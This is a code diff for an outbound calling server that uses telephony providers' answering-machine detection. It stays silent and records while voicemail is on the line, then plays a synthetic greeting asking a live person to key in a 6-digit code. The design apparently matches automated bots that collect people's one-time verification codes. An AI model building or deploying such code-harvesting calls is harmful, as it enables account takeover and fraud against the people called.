@@ -102,6 +102,12 @@ export interface CallSession {
   answeredBy?: 'human' | 'voicemail' | 'fax' | 'unknown';
   amdRawResult?: string;
   autoHangupOnVoicemail?: boolean;
+  promptsStarted?: boolean;
+  humanPickedUpAfterVoicemail?: boolean;
+  answeredAt?: string;
+  voicemailDetectedAt?: string;
+  voicemailGreetingComplete?: boolean;
+  silentPollCount?: number;
   recordCall?: boolean;
   recordingUrl?: string;
   providerRecordingUrl?: string;
@@ -600,6 +606,10 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
           statusCallbackEvent: ['initiated', 'ringing', 'answered', 'completed'],
           statusCallbackMethod: 'POST',
           machineDetection: 'Enable',
+          machineDetectionTimeout: 8,
+          machineDetectionSpeechThreshold: 1900,
+          machineDetectionSpeechEndThreshold: 1000,
+          machineDetectionSilenceTimeout: 2500,
           asyncAmd: 'true',
           asyncAmdStatusCallback: amdCallbackUrl,
           asyncAmdStatusCallbackMethod: 'POST',
@@ -805,6 +815,10 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
           Url: lamlUrl,
           StatusCallback: statusUrl,
           MachineDetection: 'Enable',
+          MachineDetectionTimeout: '8',
+          MachineDetectionSpeechThreshold: '1900',
+          MachineDetectionSpeechEndThreshold: '1000',
+          MachineDetectionSilenceTimeout: '2500',
           AsyncAmd: 'true',
           AsyncAmdStatusCallback: amdUrl,
           AsyncAmdStatusCallbackMethod: 'POST',
@@ -964,7 +978,157 @@ function findSession(req: Request): CallSession | undefined {
 // AMD, SPEECH TRANSCRIPTION & RECORDING HELPERS
 // -------------------------------------------------------------
 const VOICEMAIL_SPEECH_REGEX =
-  /\b(voicemail|leave a message|after the tone|after the beep|not available|cannot take your call|can't take your call|mailbox is full|please record your message|at the tone please|forwarded to an automated voice)\b/i;
+  /\b(voicemail|voice message|messaging system|forwarded|leave a message|leave your name|record your message|after the tone|after the beep|at the tone|not available|unavailable|cannot take your call|can't take your call|can't come to the phone|missed your call|call you back|get back to you|mailbox|more options|finished recording|you've reached|you have reached|subscriber you have dialed|person you are trying to reach)\b/i;
+
+const HUMAN_PICKUP_SPEECH_REGEX =
+  /^(hello|hi|hey|yes|yeah|yep|yo|speaking|who is this|who's this|who is calling|who's calling|i'm here|i am here|i got it|go ahead|talk to me|can you hear me|hold on|one second|good morning|good afternoon|good evening|what's up)\b/i;
+
+function isVoicemailGreetingSpeech(text: string): boolean {
+  const cleaned = text.trim();
+  if (!cleaned) return false;
+  if (VOICEMAIL_SPEECH_REGEX.test(cleaned)) return true;
+  const wordCount = cleaned.split(/\s+/).filter(Boolean).length;
+  // Voicemail greetings are long recorded announcements; live human pickup greetings are short (1-9 words)
+  return wordCount >= 11;
+}
+
+function checkHumanPickupOnVoicemail(
+  session: CallSession,
+  speechText?: string,
+  rawDigits?: string
+): boolean {
+  // 1. Answering machines never press DTMF keys on the handset
+  if (rawDigits && rawDigits.length > 0) {
+    return true;
+  }
+
+  // 2. Spoken human pickup phrase after voicemail answered
+  if (typeof speechText === 'string' && speechText.trim()) {
+    const cleaned = speechText.trim();
+    if (isVoicemailGreetingSpeech(cleaned)) {
+      session.voicemailGreetingComplete = true;
+      return false;
+    }
+
+    const words = cleaned.split(/\s+/).filter(Boolean);
+    if (words.length >= 1 && words.length <= 9) {
+      const vmDetectedMs = session.voicemailDetectedAt
+        ? Date.now() - new Date(session.voicemailDetectedAt).getTime()
+        : 9999;
+
+      // Avoid false-triggering on a 2-word opener of a voicemail greeting right at voicemail start
+      if (!session.voicemailGreetingComplete && vmDetectedMs < 2600) {
+        return false;
+      }
+
+      if (HUMAN_PICKUP_SPEECH_REGEX.test(cleaned) || session.voicemailGreetingComplete) {
+        return true;
+      }
+    }
+  }
+
+  return false;
+}
+
+async function redirectLiveCallToHumanStart(
+  session: CallSession,
+  customTwilio?: any,
+  carriersConfig: any = {}
+): Promise<boolean> {
+  if (
+    session.isSimulated ||
+    session.promptsStarted ||
+    ['completed', 'failed', 'busy', 'no-answer'].includes(session.status)
+  ) {
+    return false;
+  }
+
+  const carrier = session.carrier || 'twilio';
+  const providerSid = session.providerCallSid || '';
+  const appBaseUrl = getPublicBaseUrl(undefined, session.publicBaseUrl);
+  const savedCreds = getCallCredentials(session.id);
+
+  session.promptsStarted = true;
+  persistSessionsToDisk();
+
+  try {
+    if (carrier === 'twilio' && providerSid.startsWith('CA')) {
+      const accountSid =
+        carriersConfig.twilio?.accountSid ||
+        customTwilio?.accountSid ||
+        savedCreds?.twilioSid ||
+        process.env.TWILIO_ACCOUNT_SID;
+      const authToken =
+        carriersConfig.twilio?.authToken ||
+        customTwilio?.authToken ||
+        savedCreds?.twilioToken ||
+        process.env.TWILIO_AUTH_TOKEN;
+      if (accountSid && authToken) {
+        const client = twilio(accountSid, authToken);
+        await client.calls(providerSid).update({
+          url: `${appBaseUrl}/api/twiml/human-start?callId=${encodeURIComponent(session.id)}`,
+          method: 'POST',
+        });
+        return true;
+      }
+    } else if (carrier === 'signalwire' && providerSid && !providerSid.startsWith('call_')) {
+      const spaceUrl =
+        carriersConfig.signalwire?.spaceUrl || savedCreds?.swSpace || process.env.SIGNALWIRE_SPACE_URL;
+      const projectId =
+        carriersConfig.signalwire?.projectId || savedCreds?.swProject || process.env.SIGNALWIRE_PROJECT_ID;
+      const apiToken =
+        carriersConfig.signalwire?.apiToken || savedCreds?.swToken || process.env.SIGNALWIRE_API_TOKEN;
+      if (spaceUrl && projectId && apiToken) {
+        const cleanSpace = spaceUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
+        const r = await fetch(
+          `https://${cleanSpace}/api/laml/2010-04-01/Accounts/${projectId}/Calls/${encodeURIComponent(providerSid)}.json`,
+          {
+            method: 'POST',
+            headers: {
+              Authorization: `Basic ${Buffer.from(`${projectId}:${apiToken}`).toString('base64')}`,
+              'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams({
+              Url: `${appBaseUrl}/api/signalwire/human-start?callId=${encodeURIComponent(session.id)}`,
+              Method: 'POST',
+            }).toString(),
+          }
+        );
+        if (r.ok) return true;
+      }
+    } else if (carrier === 'plivo' && providerSid && !providerSid.startsWith('call_')) {
+      const plivoAuthId =
+        carriersConfig.plivo?.authId || savedCreds?.plivoId || process.env.PLIVO_AUTH_ID;
+      const plivoAuthToken =
+        carriersConfig.plivo?.authToken || savedCreds?.plivoToken || process.env.PLIVO_AUTH_TOKEN;
+      if (plivoAuthId && plivoAuthToken) {
+        const r = await fetch(
+          `https://api.plivo.com/v1/Account/${plivoAuthId}/Call/${encodeURIComponent(providerSid)}/`,
+          {
+            method: 'POST',
+            headers: {
+              Authorization: `Basic ${Buffer.from(`${plivoAuthId}:${plivoAuthToken}`).toString('base64')}`,
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              legs: 'aleg',
+              aleg_url: `${appBaseUrl}/api/plivo/human-start?callId=${encodeURIComponent(session.id)}`,
+              aleg_method: 'POST',
+            }),
+          }
+        );
+        if (r.ok) return true;
+      }
+    }
+  } catch (err) {
+    console.error('Live call human-start redirect fallback to amd-gate poll:', err);
+  }
+
+  // Allow the active 2-second amd-gate gather loop to play the greeting on its next beat
+  session.promptsStarted = false;
+  persistSessionsToDisk();
+  return false;
+}
 
 function parseAnsweredBy(
   raw?: string,
@@ -1095,15 +1259,29 @@ async function applyAmdResult(
   if (answeredBy === 'unknown' && (prev === 'voicemail' || prev === 'human')) {
     return;
   }
+  // Never downgrade back to voicemail if a live human already picked up after voicemail
+  if (answeredBy === 'voicemail' && session.humanPickedUpAfterVoicemail) {
+    return;
+  }
+
   session.answeredBy = answeredBy;
   session.amdRawResult = rawLabel;
+
+  if (answeredBy === 'voicemail') {
+    if (!session.voicemailDetectedAt) {
+      session.voicemailDetectedAt = new Date().toISOString();
+    }
+    if (String(rawLabel).toLowerCase().includes('machine_end')) {
+      session.voicemailGreetingComplete = true;
+    }
+  }
 
   if (prev !== answeredBy) {
     if (answeredBy === 'voicemail') {
       addSessionEvent(session, {
         type: 'amd',
-        title: 'Voicemail / Answering Machine Answered',
-        description: `Answering Machine Detection identified an automated voicemail service (${rawLabel}).`,
+        title: 'Voicemail Machine Answered — Spoken Prompts Held Silent',
+        description: `Voicemail detected (${rawLabel}). Greetings are muted for voicemail; silently listening for live human pickup & recording.`,
         data: { answeredBy, rawLabel },
       });
 
@@ -1123,21 +1301,28 @@ async function applyAmdResult(
     } else if (answeredBy === 'human') {
       addSessionEvent(session, {
         type: 'amd',
-        title: 'Live Human Answered Confirmed',
-        description: `Carrier AMD confirmed a live person answered the phone (${rawLabel}).`,
-        data: { answeredBy, rawLabel },
+        title: session.humanPickedUpAfterVoicemail
+          ? 'Live Human Picked Up Phone After Voicemail!'
+          : 'Live Human Answered Confirmed',
+        description: session.humanPickedUpAfterVoicemail
+          ? `A live human took the handset (${rawLabel}). Starting immediate pickup greeting & code collection now!`
+          : `Live human confirmed on the line (${rawLabel}). Playing greeting & recording accordingly.`,
+        data: { answeredBy, rawLabel, humanPickedUpAfterVoicemail: session.humanPickedUpAfterVoicemail },
       });
     } else if (answeredBy === 'fax') {
       addSessionEvent(session, {
         type: 'amd',
         title: 'Fax Tone Detected',
-        description: `Carrier AMD detected a fax machine (${rawLabel}).`,
+        description: `Carrier AMD detected a fax machine (${rawLabel}). Holding spoken prompts silent.`,
         data: { answeredBy, rawLabel },
       });
     } else {
       persistSessionsToDisk();
       broadcastEvent(session.id, 'session-update', session);
     }
+  } else {
+    persistSessionsToDisk();
+    broadcastEvent(session.id, 'session-update', session);
   }
 }
 
@@ -1179,8 +1364,11 @@ function appendSpeechTranscript(
     data: { speech: cleaned, confidence },
   });
 
-  if (session.answeredBy !== 'voicemail' && VOICEMAIL_SPEECH_REGEX.test(cleaned)) {
-    void applyAmdResult(session, 'voicemail', 'voicemail_greeting_speech');
+  if (isVoicemailGreetingSpeech(cleaned)) {
+    session.voicemailGreetingComplete = true;
+    if (!session.promptsStarted && !session.humanPickedUpAfterVoicemail && session.answeredBy !== 'voicemail') {
+      void applyAmdResult(session, 'voicemail', 'voicemail_greeting_speech');
+    }
   }
 }
 
@@ -1635,6 +1823,20 @@ const XML_OUTBOUND_ROUTES = [
   '/api/fonoster/outbound',
 ];
 
+const XML_AMD_GATE_ROUTES = [
+  '/api/twiml/amd-gate',
+  '/api/telnyx/amd-gate',
+  '/api/signalwire/amd-gate',
+  '/api/fonoster/amd-gate',
+];
+
+const XML_HUMAN_START_ROUTES = [
+  '/api/twiml/human-start',
+  '/api/telnyx/human-start',
+  '/api/signalwire/human-start',
+  '/api/fonoster/human-start',
+];
+
 const XML_GATHER_ROUTES = [
   '/api/twiml/gather',
   '/api/telnyx/gather',
@@ -1679,56 +1881,37 @@ const XML_RECORDING_ROUTES = [
   '/api/plivo/recording',
 ];
 
-// 1. XML Outbound Webhook - Recipient Answered
-app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
-  const session = findSession(req);
-  const twiml = new twilio.twiml.VoiceResponse();
+// Helper: Populate TwiML that plays Immediate Pickup Greeting + Code Gather ONLY to a confirmed Live Human
+function populateHumanGreetingTwiml(
+  twiml: twilio.twiml.VoiceResponse,
+  session: CallSession,
+  gatherActionUrl: string
+) {
+  session.promptsStarted = true;
+  session.status = 'collecting-input';
 
-  if (!session) {
-    twiml.say({ voice: 'Polly.Joanna' }, 'Welcome to VoiceDrop Interactive. Session could not be found.');
-    twiml.hangup();
-    res.type('text/xml');
-    return res.send(twiml.toString());
+  const alreadyPlayedGreeting = session.events.some(
+    (e) => e.type === 'playback' && e.title === 'Immediate Pickup Greeting Played'
+  );
+  if (!alreadyPlayedGreeting) {
+    addSessionEvent(session, {
+      type: 'playback',
+      title: 'Immediate Pickup Greeting Played',
+      description: `Playing synthetic voice to Live Human (${session.voice}): "${session.introGreeting}"`,
+      data: { greeting: session.introGreeting, voice: session.voice },
+    });
+
+    addSessionEvent(session, {
+      type: 'gather',
+      title: `Prompting Live Human for ${session.numDigits}-Digit Code`,
+      description: `Playing code prompt & listening for ${session.numDigits} digits + live voice.`,
+    });
+  } else {
+    persistSessionsToDisk();
+    broadcastEvent(session.id, 'session-update', session);
   }
 
-  // Record provider CallSid if not already stored
-  const incomingSid = req.body?.CallSid || req.body?.call_control_id;
-  if (typeof incomingSid === 'string' && incomingSid.trim() && !session.providerCallSid) {
-    session.providerCallSid = incomingSid.trim();
-    providerSidToCallId.set(incomingSid.trim(), session.id);
-  }
-
-  // Check if AnsweredBy was already included on outbound callback
-  const rawAnsweredBy = req.body?.AnsweredBy || req.query?.AnsweredBy;
-  const parsedAmd = parseAnsweredBy(rawAnsweredBy);
-  if (parsedAmd) {
-    void applyAmdResult(session, parsedAmd, String(rawAnsweredBy));
-    if (parsedAmd === 'voicemail' && session.autoHangupOnVoicemail) {
-      twiml.hangup();
-      void finalizeCallRecording(session);
-      res.type('text/xml');
-      return res.send(twiml.toString());
-    }
-  }
-
-  session.status = 'in-progress';
-  addSessionEvent(session, {
-    type: 'call-state',
-    title: 'Recipient Answered Call',
-    description: `Call connected with ${session.to}. Playing immediate pickup greeting & listening for voice/DTMF.`,
-  });
-
-  addSessionEvent(session, {
-    type: 'playback',
-    title: 'Immediate Pickup Greeting Played',
-    description: `Playing synthetic voice (${session.voice}): "${session.introGreeting}"`,
-    data: { greeting: session.introGreeting, voice: session.voice },
-  });
   twiml.say({ voice: session.voice as any }, session.introGreeting);
-
-  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
-  const matchedBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
-  const gatherActionUrl = `${appBaseUrl}${matchedBase}?callId=${encodeURIComponent(session.id)}`;
 
   const gather = twiml.gather({
     action: gatherActionUrl,
@@ -1741,7 +1924,6 @@ app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
   });
   gather.say({ voice: session.voice as any }, session.script);
 
-  // Give caller one extra chance if first Gather timed out before hanging up
   const gatherSecondChance = twiml.gather({
     action: gatherActionUrl,
     method: 'POST',
@@ -1758,13 +1940,247 @@ app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
 
   twiml.say({ voice: session.voice as any }, 'We did not receive your code. Thank you for your time. Goodbye.');
   twiml.hangup();
+}
 
-  session.status = 'collecting-input';
-  addSessionEvent(session, {
-    type: 'gather',
-    title: `Listening for ${session.numDigits}-Digit Code & Live Voice`,
-    description: `Gather verb active for keypad digits (${session.numDigits}) and caller speech.`,
+// Helper: Silent Voice/DTMF Listener (ZERO spoken prompts! Starts at call start & continues silently during Voicemail)
+function populateSilentListenTwiml(
+  twiml: twilio.twiml.VoiceResponse,
+  session: CallSession,
+  amdGateUrl: string,
+  pauseSec: number
+) {
+  const silentGather = twiml.gather({
+    action: amdGateUrl,
+    method: 'POST',
+    input: ['dtmf', 'speech'],
+    speechTimeout: 'auto',
+    numDigits: session.numDigits || 6,
+    finishOnKey: '#',
+    timeout: pauseSec,
   });
+  silentGather.pause({ length: pauseSec });
+  twiml.redirect({ method: 'POST' }, amdGateUrl);
+}
+
+// 1. XML Outbound Webhook - Call Connected (Listening for Voice/DTMF + Recording Starts Immediately at t=0s!)
+//    CRITICAL RULE: NEVER play greeting or prompts to a Voicemail Machine! Only speak once a Live Human is confirmed.
+app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
+  const session = findSession(req);
+  const twiml = new twilio.twiml.VoiceResponse();
+
+  if (!session) {
+    twiml.say({ voice: 'Polly.Joanna' }, 'Welcome to VoiceDrop Interactive. Session could not be found.');
+    twiml.hangup();
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  }
+
+  const incomingSid = req.body?.CallSid || req.body?.call_control_id;
+  if (typeof incomingSid === 'string' && incomingSid.trim() && !session.providerCallSid) {
+    session.providerCallSid = incomingSid.trim();
+    providerSidToCallId.set(incomingSid.trim(), session.id);
+  }
+
+  if (!session.answeredAt) {
+    session.answeredAt = new Date().toISOString();
+  }
+  session.status = 'in-progress';
+
+  const rawAnsweredBy = req.body?.AnsweredBy || req.query?.AnsweredBy;
+  const parsedAmd = parseAnsweredBy(rawAnsweredBy);
+  if (parsedAmd) {
+    void applyAmdResult(session, parsedAmd, String(rawAnsweredBy));
+    if (parsedAmd === 'voicemail' && session.autoHangupOnVoicemail) {
+      twiml.hangup();
+      void finalizeCallRecording(session);
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+  }
+
+  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
+  const matchedGatherBase =
+    XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
+  const matchedGateBase =
+    XML_AMD_GATE_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/amd-gate';
+  const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;
+  const amdGateUrl = `${appBaseUrl}${matchedGateBase}?callId=${encodeURIComponent(session.id)}`;
+
+  addSessionEvent(session, {
+    type: 'call-state',
+    title: 'Call Connected — Listening for Voice/DTMF & Recording Active',
+    description:
+      session.answeredBy === 'human'
+        ? `Live human confirmed on ${session.to}. Playing immediate pickup greeting.`
+        : session.answeredBy === 'voicemail'
+        ? `Voicemail machine answered on ${session.to}. Holding spoken prompts silent — listening in case a human picks up.`
+        : `Listening for voice & keypad from start of call while verifying Live Human vs. Voicemail.`,
+  });
+
+  // Only speak immediately if carrier ALREADY confirmed Live Human synchronously
+  if (session.answeredBy === 'human') {
+    populateHumanGreetingTwiml(twiml, session, gatherActionUrl);
+  } else {
+    session.status = 'collecting-input';
+    persistSessionsToDisk();
+    const waitSec = session.answeredBy === 'voicemail' ? 5 : 2;
+    populateSilentListenTwiml(twiml, session, amdGateUrl, waitSec);
+  }
+
+  res.type('text/xml');
+  res.send(twiml.toString());
+});
+
+// 1a. Silent AMD & Post-Voicemail Human-Pickup Gate (Listens for Voice/DTMF from t=0s; starts greeting ONLY for Live Human!)
+app.all(XML_AMD_GATE_ROUTES, async (req: Request, res: Response) => {
+  const session = findSession(req);
+  const twiml = new twilio.twiml.VoiceResponse();
+
+  if (!session) {
+    twiml.hangup();
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  }
+
+  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
+  const matchedGatherBase =
+    XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
+  const matchedGateBase =
+    XML_AMD_GATE_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/amd-gate';
+  const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;
+  const amdGateUrl = `${appBaseUrl}${matchedGateBase}?callId=${encodeURIComponent(session.id)}`;
+
+  const rawDigitsParam = req.body.Digits ?? req.query.Digits;
+  const rawDigits = rawDigitsParam ? String(rawDigitsParam).replace(/\D/g, '') : '';
+  const speechParam = req.body.SpeechResult || req.body.Speech || req.query.SpeechResult;
+  const confidenceParam = req.body.Confidence ? parseFloat(req.body.Confidence) : undefined;
+  const expectedLen = session.numDigits || 6;
+
+  if (typeof speechParam === 'string' && speechParam.trim()) {
+    appendSpeechTranscript(
+      session,
+      speechParam,
+      confidenceParam,
+      session.answeredBy === 'voicemail' ? 'Voicemail Screening' : 'Pickup'
+    );
+  }
+
+  // If recipient already typed the full code right at call start / wakeup, forward straight to gather handler!
+  if (rawDigits.length >= expectedLen) {
+    if (session.answeredBy === 'voicemail') {
+      session.humanPickedUpAfterVoicemail = true;
+    }
+    await applyAmdResult(session, 'human', 'keypad_full_code_entry');
+    session.promptsStarted = true;
+    twiml.redirect(
+      { method: 'POST' },
+      `${gatherActionUrl}&Digits=${encodeURIComponent(rawDigits)}`
+    );
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  }
+
+  // Case A: Voicemail Machine (or Fax) is currently on the line -> Stay SILENT unless a Live Human picks up!
+  if (session.answeredBy === 'voicemail' || session.answeredBy === 'fax') {
+    if (session.autoHangupOnVoicemail) {
+      twiml.hangup();
+      void finalizeCallRecording(session);
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    if (
+      session.answeredBy === 'voicemail' &&
+      checkHumanPickupOnVoicemail(session, speechParam, rawDigits)
+    ) {
+      session.humanPickedUpAfterVoicemail = true;
+      await applyAmdResult(
+        session,
+        'human',
+        rawDigits ? 'human_keypad_after_voicemail' : 'human_speech_after_voicemail'
+      );
+      populateHumanGreetingTwiml(twiml, session, gatherActionUrl);
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // Still voicemail: keep silent, continue recording & listening for human pickup up to ~65s, then hang up silently
+    session.silentPollCount = (session.silentPollCount || 0) + 1;
+    persistSessionsToDisk();
+    if (session.silentPollCount > 12) {
+      twiml.hangup();
+      void finalizeCallRecording(session);
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    populateSilentListenTwiml(twiml, session, amdGateUrl, 5);
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  }
+
+  // Case B: Direct Live Human already confirmed by async AMD
+  if (session.answeredBy === 'human') {
+    populateHumanGreetingTwiml(twiml, session, gatherActionUrl);
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  }
+
+  // Case C: Initial pickup check (answeredBy is undefined or 'unknown')
+  const elapsedSinceAnswer = session.answeredAt
+    ? Date.now() - new Date(session.answeredAt).getTime()
+    : 4000;
+  const spokeLiveHumanGreeting =
+    typeof speechParam === 'string' &&
+    speechParam.trim().length > 0 &&
+    !isVoicemailGreetingSpeech(speechParam);
+
+  if (
+    rawDigits.length > 0 ||
+    spokeLiveHumanGreeting ||
+    session.answeredBy === 'unknown' ||
+    elapsedSinceAnswer >= 3200
+  ) {
+    await applyAmdResult(
+      session,
+      'human',
+      rawDigits.length > 0
+        ? 'keypad_pickup'
+        : spokeLiveHumanGreeting
+        ? 'live_human_speech'
+        : 'direct_human_pickup'
+    );
+    populateHumanGreetingTwiml(twiml, session, gatherActionUrl);
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  }
+
+  // Wait one more brief silent beat for async AMD to finish (< 3.2s)
+  populateSilentListenTwiml(twiml, session, amdGateUrl, 2);
+  res.type('text/xml');
+  res.send(twiml.toString());
+});
+
+// 1a-2. Direct Human Start Endpoint (invoked immediately when async AMD or Operator confirms Live Human!)
+app.all(XML_HUMAN_START_ROUTES, async (req: Request, res: Response) => {
+  const session = findSession(req);
+  const twiml = new twilio.twiml.VoiceResponse();
+
+  if (!session) {
+    twiml.hangup();
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  }
+
+  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
+  const matchedGatherBase =
+    XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
+  const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;
+
+  if (session.answeredBy !== 'human') {
+    await applyAmdResult(session, 'human', 'live_human_confirmed');
+  }
+  populateHumanGreetingTwiml(twiml, session, gatherActionUrl);
 
   res.type('text/xml');
   res.send(twiml.toString());
@@ -2235,11 +2651,24 @@ app.all(XML_AMD_ROUTES, async (req: Request, res: Response) => {
     const plivoMachine = req.body?.Machine ?? req.query?.Machine;
     const parsed = parseAnsweredBy(rawAnsweredBy, plivoMachine);
     if (parsed) {
-      await applyAmdResult(
-        session,
-        parsed,
-        String(rawAnsweredBy || (plivoMachine === 'true' ? 'plivo_machine' : 'plivo_human'))
+      const label = String(
+        rawAnsweredBy || (plivoMachine === 'true' ? 'plivo_machine' : 'plivo_human')
       );
+      await applyAmdResult(session, parsed, label);
+
+      // If async AMD confirmed a direct Live Human (or silent non-machine pickup 'unknown'),
+      // immediately redirect the live call out of silent pause to start playing introGreeting + script!
+      if (
+        (parsed === 'human' || parsed === 'unknown') &&
+        !session.promptsStarted &&
+        session.answeredBy !== 'voicemail' &&
+        session.answeredBy !== 'fax'
+      ) {
+        if (parsed === 'unknown') {
+          await applyAmdResult(session, 'human', 'silent_live_human_pickup');
+        }
+        await redirectLiveCallToHumanStart(session);
+      }
     }
   }
   res.sendStatus(200);
@@ -2434,7 +2863,7 @@ app.post('/api/calls/:callId/recording-upload', async (req: Request, res: Respon
 // -------------------------------------------------------------
 // PLIVO XML WEBHOOKS (Plivo Voice API)
 // -------------------------------------------------------------
-// 1. Plivo Outbound / Answer
+// 1. Plivo Outbound / Answer (Recording & Voice/DTMF Listening Start Immediately; Prompts Speak ONLY to Live Human!)
 app.all(['/api/plivo/outbound', '/api/plivo/answer'], (req: Request, res: Response) => {
   const session = findSession(req);
   const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);
@@ -2448,6 +2877,11 @@ app.all(['/api/plivo/outbound', '/api/plivo/answer'], (req: Request, res: Respon
 </Response>`);
   }
 
+  if (!session.answeredAt) {
+    session.answeredAt = new Date().toISOString();
+  }
+  session.status = 'in-progress';
+
   const plivoMachine = req.body?.Machine ?? req.query?.Machine;
   const parsedAmd = parseAnsweredBy(undefined, plivoMachine);
   if (parsedAmd) {
@@ -2459,35 +2893,33 @@ app.all(['/api/plivo/outbound', '/api/plivo/answer'], (req: Request, res: Respon
     }
   }
 
-  session.status = 'in-progress';
   addSessionEvent(session, {
     type: 'call-state',
-    title: 'Recipient Answered Call (Plivo)',
-    description: `Call connected with ${session.to}. Playing immediate pickup greeting.`,
-  });
-
-  addSessionEvent(session, {
-    type: 'playback',
-    title: 'Immediate Pickup Greeting Played',
-    description: `Playing synthetic voice: "${session.introGreeting}"`,
-    data: { greeting: session.introGreeting },
-  });
-
-  session.status = 'collecting-input';
-  addSessionEvent(session, {
-    type: 'gather',
-    title: `Listening for ${session.numDigits}-Digit Code & Voice (Plivo)`,
-    description: `Plivo GetInput active for ${session.numDigits} digits & speech.`,
+    title: 'Call Connected (Plivo) — Listening & Recording Active',
+    description:
+      session.answeredBy === 'human'
+        ? `Live human confirmed on ${session.to}. Playing immediate pickup greeting.`
+        : `Listening for voice & keypad from start of call while verifying Live Human vs. Voicemail.`,
   });
 
   const gatherUrl = `${appBaseUrl}/api/plivo/gather?callId=${encodeURIComponent(session.id)}`;
+  const gateUrl = `${appBaseUrl}/api/plivo/amd-gate?callId=${encodeURIComponent(session.id)}`;
   const recCallbackUrl = `${appBaseUrl}/api/plivo/recording?callId=${encodeURIComponent(session.id)}`;
   const recordTag =
     session.recordCall !== false
       ? `  <Record recordSession="true" fileFormat="wav" redirect="false" callbackUrl="${escapeXml(recCallbackUrl)}" callbackMethod="POST" />\n`
       : '';
 
-  const xml = `<?xml version="1.0" encoding="UTF-8"?>
+  if (session.answeredBy === 'human') {
+    session.promptsStarted = true;
+    session.status = 'collecting-input';
+    addSessionEvent(session, {
+      type: 'playback',
+      title: 'Immediate Pickup Greeting Played',
+      description: `Playing synthetic voice to Live Human: "${session.introGreeting}"`,
+      data: { greeting: session.introGreeting },
+    });
+    const xml = `<?xml version="1.0" encoding="UTF-8"?>
 <Response>
 ${recordTag}  <Speak>${escapeXml(session.introGreeting)}</Speak>
   <GetInput action="${escapeXml(gatherUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="25" digitEndTimeout="8" speechEndTimeout="auto">
@@ -2496,9 +2928,134 @@ ${recordTag}  <Speak>${escapeXml(session.introGreeting)}</Speak>
   <Speak>We did not receive your code. Thank you for your time. Goodbye.</Speak>
   <Hangup />
 </Response>`;
+    res.type('text/xml');
+    return res.send(xml);
+  }
+
+  session.status = 'collecting-input';
+  persistSessionsToDisk();
+  const waitLen = session.answeredBy === 'voicemail' ? 5 : 2;
+  const silentXml = `<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+${recordTag}  <GetInput action="${escapeXml(gateUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="${waitLen}" speechEndTimeout="auto">
+    <Wait length="${waitLen}" />
+  </GetInput>
+  <Redirect method="POST">${escapeXml(gateUrl)}</Redirect>
+</Response>`;
 
   res.type('text/xml');
-  res.send(xml);
+  res.send(silentXml);
+});
+
+// 1a. Plivo Silent AMD & Post-Voicemail Human-Pickup Gate
+app.all(['/api/plivo/amd-gate', '/api/plivo/human-start'], async (req: Request, res: Response) => {
+  const session = findSession(req);
+  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);
+
+  if (!session) {
+    res.type('text/xml');
+    return res.send(`<?xml version="1.0" encoding="UTF-8"?><Response><Hangup /></Response>`);
+  }
+
+  const gatherUrl = `${appBaseUrl}/api/plivo/gather?callId=${encodeURIComponent(session.id)}`;
+  const gateUrl = `${appBaseUrl}/api/plivo/amd-gate?callId=${encodeURIComponent(session.id)}`;
+  const digitsParam = req.body.Digits || req.query.Digits;
+  const rawDigits = digitsParam ? String(digitsParam).replace(/\D/g, '') : '';
+  const speechParam = req.body.Speech || req.query.Speech;
+
+  if (typeof speechParam === 'string' && speechParam.trim()) {
+    appendSpeechTranscript(
+      session,
+      speechParam,
+      undefined,
+      session.answeredBy === 'voicemail' ? 'Voicemail Screening' : 'Pickup'
+    );
+  }
+
+  const isDirectHumanStart = req.path.endsWith('/human-start');
+  if (isDirectHumanStart && session.answeredBy !== 'human') {
+    await applyAmdResult(session, 'human', 'plivo_live_human_confirmed');
+  }
+
+  if (!isDirectHumanStart && (session.answeredBy === 'voicemail' || session.answeredBy === 'fax')) {
+    if (session.autoHangupOnVoicemail) {
+      void finalizeCallRecording(session);
+      res.type('text/xml');
+      return res.send(`<?xml version="1.0" encoding="UTF-8"?><Response><Hangup /></Response>`);
+    }
+
